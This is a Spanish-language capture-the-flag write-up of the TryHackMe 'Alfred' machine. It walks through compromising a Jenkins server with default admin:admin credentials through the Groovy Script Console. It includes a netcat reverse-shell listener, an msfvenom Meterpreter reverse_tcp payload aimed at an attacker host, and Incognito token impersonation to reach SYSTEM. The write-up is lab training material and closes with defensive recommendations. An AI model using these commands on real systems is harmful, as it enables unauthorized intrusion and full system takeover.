# Alfred — TryHackMe

**Plataforma:** TryHackMe
**Sistema operativo:** Windows
**Dificultad:** Fácil/Media
**Categoría:** Jenkins RCE, Escalada de privilegios (Token Impersonation)

## Resumen

Máquina Windows que expone un servidor Jenkins con credenciales por defecto. El acceso a la consola de Groovy Script permite ejecución remota de comandos, y el abuso de privilegios `SeImpersonatePrivilege` mediante el módulo Incognito de Meterpreter permite escalar a `NT AUTHORITY\SYSTEM`.

## 1. Reconocimiento

Escaneo completo de puertos con Nmap:

```bash
sudo nmap -n -Pn -sS -T4 --open -p- --min-rate 3000 <IP>
```

Puertos abiertos:

| Puerto | Servicio |
|---|---|
| 80 | HTTP (IIS) |
| 3389 | RDP |
| 8080 | HTTP-Proxy (Jenkins) |

Escaneo de versiones:

```bash
sudo nmap -n -Pn -sV -sC -vv -T4 --min-rate 3000 -p80,3389,8080 <IP>
```

Se confirma servidor **Jenkins 2.190.1** en el puerto 8080.

## 2. Análisis de vulnerabilidades

| Puerto | Vulnerabilidad |
|---|---|
| 80 | Servicio web sin autenticación |
| 8080 | Jenkins accesible con credenciales por defecto |
| 3389 | Servicio RDP expuesto |

El panel de Jenkins permite acceso con credenciales por defecto (`admin:admin`), y una vez autenticado, el usuario tiene privilegios administrativos completos, incluyendo acceso a la **Script Console** (ejecución de scripts Groovy directamente sobre el sistema operativo).

## 3. Explotación

**Manual** — No se usó automatización.

1. Login exitoso en el panel de Jenkins con `admin:admin`.
2. Acceso a *Manage Jenkins → Script Console*.
3. Se ejecutó un script Groovy para lanzar una reverse shell.
4. Listener en la máquina atacante:

```bash
nc -lvnp 5000
```

5. Al ejecutar el script desde Jenkins se obtiene shell con el usuario `alfred\bruce`.

```
C:\Program Files (x86)\Jenkins>whoami
alfred\bruce
```

**Flag de usuario** localizada en `C:\Users\bruce\Desktop\user.txt`.

## 4. Escalada de privilegios

Para estabilizar el acceso se generó un payload Meterpreter con msfvenom:

```bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai \
  LHOST=<IP_atacante> LPORT=400 -f exe -o christmas.exe
```

El payload se descargó vía PowerShell en la máquina víctima y se ejecutó con un handler activo en Metasploit, obteniendo sesión Meterpreter.

Enumeración de privilegios:

```
whoami /priv
```

Resultado: el usuario cuenta con `SeDebugPrivilege` y `SeImpersonatePrivilege` habilitados — vector clásico de escalada en Windows.

Usando el módulo **Incognito**:

```
list_tokens -g
impersonate_token "BUILTIN\Administrators"
getuid
```

Resultado: `NT AUTHORITY\SYSTEM`.

Para persistencia de la sesión se migró el proceso Meterpreter a `services.exe` (PID con privilegios SYSTEM):

```
ps services.exe
migrate <PID>
```

**Flag de root** localizada en `C:\Windows\System32\config\root.txt`.

## 5. Herramientas usadas

- Nmap
- Jenkins (Script Console)
- Netcat
- Metasploit / Meterpreter
- Msfvenom
- PowerShell
- Incognito

## 6. Conclusiones y recomendaciones

1. El uso de credenciales por defecto en Jenkins representa un riesgo crítico de seguridad.
2. Jenkins permite ejecución remota directa si no se restringe adecuadamente el acceso administrativo.
3. Los privilegios de impersonación facilitaron la escalada sin necesidad de exploits adicionales.
4. **Recomendación:** cambiar credenciales por defecto, restringir el acceso a Jenkins, deshabilitar servicios innecesarios y monitorear privilegios del sistema.
